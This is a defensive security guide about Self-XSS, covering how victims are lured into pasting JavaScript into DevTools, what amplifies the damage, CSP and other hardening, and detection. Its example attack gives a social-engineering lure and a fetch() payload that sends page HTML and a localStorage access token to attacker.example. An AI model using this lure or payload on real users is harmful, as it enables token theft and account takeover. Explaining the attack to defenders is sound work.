# Self-XSS

## Summary

Self-XSS is a client-side attack in which an attacker tricks a victim into manually executing malicious JavaScript in their own browser session.
The delivery mechanism is usually social engineering rather than a normal attacker-controlled application input.
Typical lures tell the victim to open DevTools, paste a payload into the console, and run it to unlock a feature, fix an account problem, or claim a reward.

## Mental Model

```text
attacker-controlled instructions
        +
victim manually pastes JavaScript
        +
authenticated browser session
        ↓
code executes with victim privileges
        ↓
data theft / action abuse / downstream flaw trigger
```

## Why This Matters

The pasted code runs with the victim's logged-in browser state.
That means it can read browser-visible data, call same-origin APIs, scrape sensitive page content, and abuse whatever the application already allows the victim session to do.

Self-XSS is often the initial compromise step rather than the final impact.
In stronger chains, the pasted payload is only the first move before token theft, account takeover, or propagation into a separate flaw such as stored XSS.

## Vulnerable Pattern

Self-XSS becomes high impact when the application gives browser-executed JavaScript too much useful power.
Common amplifiers include:

- tokens or secrets stored in JavaScript-readable places such as `localStorage`;
- sensitive account actions that do not require reauthentication or explicit confirmation;
- public profile or content fields that can be turned into a stored XSS sink;
- permissive Content Security Policy directives that allow easy outbound exfiltration or second-stage payload loading.

## Example Attack

An attacker message might say:

```text
Open DevTools, paste this into the console, and press Enter to unlock the hidden premium mode.
```

The attached payload might then run:

```js
fetch("https://attacker.example/collect", {
  method: "POST",
  mode: "no-cors",
  body: JSON.stringify({
    html: document.documentElement.outerHTML,
    token: localStorage.getItem("access_token"),
  }),
});
```

If the application stores powerful credentials in browser-readable storage or exposes sensitive actions to any in-page JavaScript, the attacker can steal useful state or act as the victim.

## Why The Attack Works

The browser treats DevTools console execution as code running in the context of the current page.
Once the victim pastes the payload, the application's same-origin privileges and any browser-visible session state become available to that code.

The social-engineering step matters, but it does not erase application-side risk.
Applications that expose tokens to JavaScript, skip step-up checks for sensitive actions, or allow unsafe persistence can turn a paste event into a much larger compromise.

## Safer Pattern

Reduce the usefulness of arbitrary JavaScript running in an authenticated browser session.

Console warnings can reduce successful attacks by telling non-technical users not to paste code into developer features.

```js
console.log("%cSTOP!", "color: red; font-size: 40px; font-weight: bold;");
console.log(
  "%cThis is a browser feature intended for developers. Pasting code here can give attackers access to your account.",
  "font-size: 16px;",
);
```

Additional hardening measures:

- keep session credentials out of JavaScript-readable storage where possible;
- require reauthentication, step-up confirmation, or other strong server-side checks for sensitive actions;
- use a strict Content Security Policy to reduce common exfiltration and payload-loading paths;
- treat public or persistent user-controlled content as untrusted so a pasted payload cannot easily convert into stored XSS.

A strict Content Security Policy cannot be trusted to stop user-pasted DevTools code from starting.
It can still reduce impact by blocking common follow-on behavior.

- `connect-src 'self'` can block many exfiltration patterns through `fetch()`, `XMLHttpRequest`, `WebSocket`, `EventSource`, and `navigator.sendBeacon()`.
- `img-src 'self'` can block image-based exfiltration tricks such as `new Image().src = "https://attacker.example/..."`.
- A strict `script-src` and related fetch directives can block loading larger second-stage payloads from attacker-controlled origins.

## Detection

Self-XSS is usually a weak standalone scanner target.
The core trigger is social engineering, so automated detection often has low signal if it tries to flag the note itself as a normal rule.

Reviewer-driven detection is more useful.
Look for downstream amplifiers such as browser-readable tokens, privileged actions callable without reauthentication, unsafe persistence of user-controlled HTML, and overly permissive CSP or network egress behavior.

If one of those downstream issues is concretely detectable, write a standard `WOF-*` guide for that application flaw instead of trying to force Self-XSS itself into the catalog as a normal rule.

## False Positives

The presence of DevTools-related copy in documentation, support scripts, or developer-only troubleshooting material is not automatically a security finding.
Likewise, a console warning banner is a mitigation detail, not evidence that a Self-XSS condition exists.

Only treat Self-XSS as relevant context when an attacker could plausibly trick real users into executing code and the application meaningfully amplifies the result.

## References

- [OWASP WSTG: Testing for Self DOM Based Cross-Site Scripting](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/01.1-Testing_for_Self_DOM_Based_Cross_Site_Scripting)
- [OWASP Content Security Policy Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- [MDN: Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP)
- [MDN: `connect-src` directive](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/connect-src)
- [MDN: `img-src` directive](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/img-src)

## Quick Checklist

- Do not store powerful session material in JavaScript-readable storage unless there is no safer alternative.
- Require strong server-side checks for sensitive account actions.
- Assume pasted or injected browser-side JavaScript will try to exfiltrate data and load second-stage payloads.
- Treat Self-XSS as context; catalog the downstream application flaw when one exists.
